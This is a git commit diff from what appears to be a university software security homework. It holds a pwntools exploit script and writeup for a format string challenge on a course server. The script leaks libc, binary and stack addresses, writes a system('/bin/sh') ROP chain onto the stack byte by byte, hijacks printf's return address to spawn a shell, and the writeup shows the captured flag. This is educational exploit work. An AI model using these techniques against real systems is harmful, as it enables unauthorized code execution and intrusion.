9692adfe314281f28078b22af12b1a2c752f5207
Tim Niklas Gruel <timniklas13@protonmail.com>
2024-11-04 00:17:55 +0100

    homework 2 finished

--- homework_02/13_echo2/solve.py
+++ homework_02/13_echo2/solve.py
@@ -9,17 +9,12 @@ ld = pwn.ELF("./ld-linux-x86-64.so.2")
 pwn.context.arch = 'amd64'
 #pwn.context.binary = exe
 
-
-conn = pwn.remote('tasks.ws24.softsec.rub.de', 33420)
+conn = pwn.remote('tasks.ws24.softsec.rub.de', 33421)
 #conn = pwn.process([exe.path])
-
-#pwn.gdb.attach(conn)
 
 #pwn.gdb.attach(conn, gdbscript="""
 #set follow-fork-mode child      
 #""")
-
-
 
 def set_format_string(fmt):
     # invert byte string, as we have to write last byte first
@@ -76,16 +71,10 @@ def print_register_and_memory(max, result):
 
 # just for testing, see what we got
 result = []
-#print_register_and_memory(50, result)
-"""
-addresses = sorted({(e,p) for e,p in result})
-print("\n\nresult")
-for address, pos in addresses:
-    print(f'{hex(address)} at input {pos}')
-"""
+print_register_and_memory(50, result)
 
 
-# Get ASLR of libc: in rdx (3rd argument is pointer to write+16)
+# 1) Get ASLR of libc: in rdx (3rd argument is pointer to write+16)
 set_format_string(b'%3$llx\n\x00')
 conn.recvuntil(b'Option? 1:set 2:print\n> ')
 conn.send(b'2\n')
@@ -95,7 +84,8 @@ conn.recvuntil(b'\n')
 
 libc_base_address = pwn.u64(pwn.unhex(rdx[:-1]).rjust(8, b'\x00'), endianness='big') - (libc.symbols['write'] + 16)
 
-# Get ASLR of vuln: in 15th input
+
+# 2) Get ASLR of vuln: in 15th input (pointer to main)
 set_format_string(b'%15$llx\n\x00')
 conn.recvuntil(b'Option? 1:set 2:print\n> ')
 conn.send(b'2\n')
@@ -106,7 +96,7 @@ conn.recvuntil(b'\n')
 vuln_base_address = pwn.u64(pwn.unhex(stack[:-1]).rjust(8, b'\x00'), endianness='big') - (exe.symbols['main'])
 
 
-# get address of stack
+# 3) get address of stack (21th input has a pointer to the stack => fixed offset to all other stack addresses)
 set_format_string(b'%21$llx\n\x00')
 conn.recvuntil(b'Option? 1:set 2:print\n> ')
 conn.send(b'2\n')
@@ -124,36 +114,37 @@ stack_address_input_11_rop_chain_start = stack_address_canarie_input_7 + 8*4
 print(f'input 11/gadget2 is at offset: {hex(stack_address_input_11_rop_chain_start)}')
 
 
-# now write 32 byte ropchain starting at stack_address_input_11_rop_chain onto stack
+# 4) now write 32 byte ropchain starting at stack_address_input_11_rop_chain onto stack
 libc.address = libc_base_address
 rop = pwn.ROP(libc)
 rop.call(rop.ret)
 rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
-
 ropchain = rop.chain()
-print(ropchain)
 
 for pos, byte in enumerate(ropchain):
-    # we write address of the stackaddress where we want to write data into stack_address_input_21
-    # thats writes input input 21+28=49
-
-    # 0x7ffd682f|aea8 (input 21 has address of vuln)
-    # just write 2 bytes at input 21, then at input21 is a pointer to stack memory where we want to write one byte, then add +1 and so on to write bytes
+    # idea: On the stack are pointers that also point onto the stack.
+    #       We only have to find a pointer that points to another pointer on the stack
+    #       Then we can provide the frist pointer as input value for the fromat string (input 21).
+    #       We will write into the second pointer where the first points to (input 49)
+    #       We just override last 2 Bytes, with a local offset on the stack of our choise.
+    #       Now we can take the second pointer (input 49) as input to write to this position onto the stack.
+    #       This allows us to completely override the stack (at least locally).
+    #       We first write a ropchain a bit deeper in the stack, byte by byte (no hurry :).
+    #       Finally we override the last 2 Bytes of the return address of printf sothat it no longer points
+    #       to an address in main, but to a gadnet in vuln that increments the stack pointer to that
+    #       our ropchain gets triggered. That's it :)
     
-    # write address we want to write to onto stack at input 21
+    # 4.1) write address where we later want to write to onto stack
     last_two_bytes = stack_address_input_11_rop_chain_start % 2**16
     print(f'doing offset: {hex(last_two_bytes+pos)} for byte {byte}')
-    #print(f'we print {last_two_bytes} bytes')
     fmt = (b'%' + str(last_two_bytes+pos).encode('ascii') + b'd') + b'%21$hn' + b'\x00'
-    
-    # set 
     set_format_string(fmt)
     conn.recvuntil(b'Option? 1:set 2:print\n> ')
     conn.send(b'2\n')
     conn.recvuntil(b'Output:\n')
     conn.recvline()
     
-    # write single byte at the address
+    # 4.2) write single byte at the address of our choice
     fmt = b''
     if byte > 0:
         fmt += (b'%' + str(byte).encode('ascii') + b'd')
@@ -165,121 +156,26 @@ for pos, byte in enumerate(ropchain):
     conn.recvline()
     
 
-# finally override last 2 bytes of return address of printf to trigger ropchain (gadget from vuln)
+# 5.) finally override last 2 bytes of return address of printf to trigger ropchain (gadget from vuln)
 trigger_gadget = 0x0000000000001469 #add rsp, 0x18; pop rbx; pop rbp; ret; 
-
-print(f'address of gadget: {hex(vuln_base_address+trigger_gadget)}')
 trigger_gadget_last_two_bytes = (vuln_base_address + trigger_gadget) % 2**16
-# main is at offset 0x4352
-#trigger_gadget = 0x0000000000004469 #add rsp, 0x18; pop rbx; pop rbp; ret; 
-#trigger_gadget = 0x0000000000003469 #add rsp, 0x18; pop rbx; pop rbp; ret; 
 
-# write address we want to write to onto stack at input 21
+
+# 5.1) write address where we later want to write to onto stack
 last_two_bytes = (stack_address_input_11_rop_chain_start-6*8) % 2**16
-print(f'overriting at stack address: {hex(last_two_bytes)}')
 fmt = (b'%' + str(last_two_bytes).encode('ascii') + b'd') + b'%21$hn' + b'\x00'
-
-# set 
 set_format_string(fmt)
 conn.recvuntil(b'Option? 1:set 2:print\n> ')
 conn.send(b'2\n')
 conn.recvuntil(b'Output:\n')
 conn.recvline()
 
-# write last 2 bytes of gadget
+# 5.2) write last 2 bytes of gadget
 fmt = (b'%' + str(trigger_gadget_last_two_bytes).encode('ascii') + b'd') + b'%49$hn' + b'\x00'
 set_format_string(fmt)
 conn.recvuntil(b'Option? 1:set 2:print\n> ')
 conn.send(b'2\n')
 conn.recvuntil(b'Output:\n')
 
-
+# interact with shell
 conn.interactive()
-exit()
-
-
-
-# invalid: 0x599434141469
-# correct: 0x599434143469
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-rop = pwn.ROP(libc)
-rop.call(rop.ret)
-rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
-
-# rop chain has 32 bytes 
-print(rop.chain())
-print(len(rop.chain()))
-
-# canarie is at input 7 (easy to recognize as 0x00 at the end/start)
-
-# Step 1: write a ropchain somewhere onto the stack (byte for byte)
-
-
-
-conn.interactive()
-
-
-
-
-
-
-
-exit()
-
-
-set_format_string(b'%22$llx\n\x00')
-conn.recvuntil(b'Option? 1:set 2:print\n> ')
-conn.send(b'2\n')
-conn.recvuntil(b'Output:\n')
-fini_array_address = conn.recvline()
-print(fini_array_address)
-
-set_format_string(b'%15$llx\n\x00')
-conn.recvuntil(b'Option? 1:set 2:print\n> ')
-conn.send(b'2\n')
-conn.recvuntil(b'Output:\n')
-address_main = conn.recvline()
-address_main = pwn.u64(pwn.unhex(address_main[:-1]).rjust(8, b'\x00'), endianness='big')
-print(hex(address_main))
-
-# extract last two bytes
-address_main_last_2_bytes = address_main % 2**16
-print(f'number of chars: {address_main_last_2_bytes}')
-
-# override return in exit()
-fmt = (b'%' + str(42).encode('ascii') + b'd') + b'%22$hhn' + b'\x00'
-set_format_string(fmt)
-conn.recvuntil(b'Option? 1:set 2:print\n> ')
-conn.send(b'2\n')
-
-
-
-
-# Step 2: override return address of printf (or other) to jump to my ropchain (first thing ropchain does is adding to rsp to move ropchain to top of stack :)
-
-
-conn.interactive()
-
-
--- homework_02/13_echo2/writeup.md
+++ homework_02/13_echo2/writeup.md
@@ -22,57 +22,8 @@ LD_DEBUG=libs ./vuln_patched
 
 ## Exploit
 - we can write arbitrary fmt string of length n, by writing last byte first and then do it in 0(n)
-- we have a pointer to 
+- we can override local stack, by using a pointer on the stack that points to another stack pointer
+- flag 
 ```
-00:0000│  5d4d1621ad68 (__do_global_dtors_aux_fini_array_entry) —▸ 0x556dabacb2c0 (__do_global_dtors_aux) ◂— endbr64 
+softsec{uEiZ1qCHPGTzmv0TFtiVTJuYpd9T5cglTQnaGcqx1TDbYX2Z1RjnJJ-PdMI0v5qT}
 ```
-- http://www.secureroot.com/security/advisories/9768329857.html
-- input argument 22 has the value: 5d4d1621ad68
-```
-info symbol 5d4d1621ad68
-```
-```
-__do_global_dtors_aux_fini_array_entry in section .fini_array of /home/timniklas/Code/software_security_1/homework_02/13_echo2/vuln_patched
-```
-- show the bytes at that address
-```
-x/1xg 5d4d1621ad68
-```
-```
-0x5d4d1621ad68:	0x00005d4d162182c0
-```
-- figure out what is there usually
-```
-telescope 0x0000556dabacb2c0
-```
-```
-00:0000│  0x556dabacb2c0 (__do_global_dtors_aux) ◂— endbr64 
-01:0008│  0x556dabacb2c8 (__do_global_dtors_aux+8) ◂— add byte ptr [rax], al
-02:0010│  0x556dabacb2d0 (__do_global_dtors_aux+16) ◂— cmp eax, 0x2d22 /* '="-' */
-```
-- that means we can override the pointer and point to our ROP chain. On exit(), our ropchain is called.
-
-- the address is similar to main+135, which is: 0x5d4d 1621|8187
--                                               0x5d4d 1621|ad68
--   address of ssize_t fmt_len                  0x5d4d|1621|b050
-- this means we only have to overrid the lower 2 Bytes = 2^16 = 65536, which should be possible
-- lets try this out: when calling exit, call main again
-
-
-
-- input 15 has pointer to main()
-
-##############################
-
-- new idea
-    - on stack are addresses from the stack/heap/code (everything we meight need)
-    - we can override the last two bytes of that address to have an arbitrary address on the stack
-    - then we can reference that input parameter and write to arbitrary memory
-
-
-
-
-    0x0000000000001469: add rsp, 0x18; pop rbx; pop rbp; ret; 
-
-
-    softsec{uEiZ1qCHPGTzmv0TFtiVTJuYpd9T5cglTQnaGcqx1TDbYX2Z1RjnJJ-PdMI0v5qT}
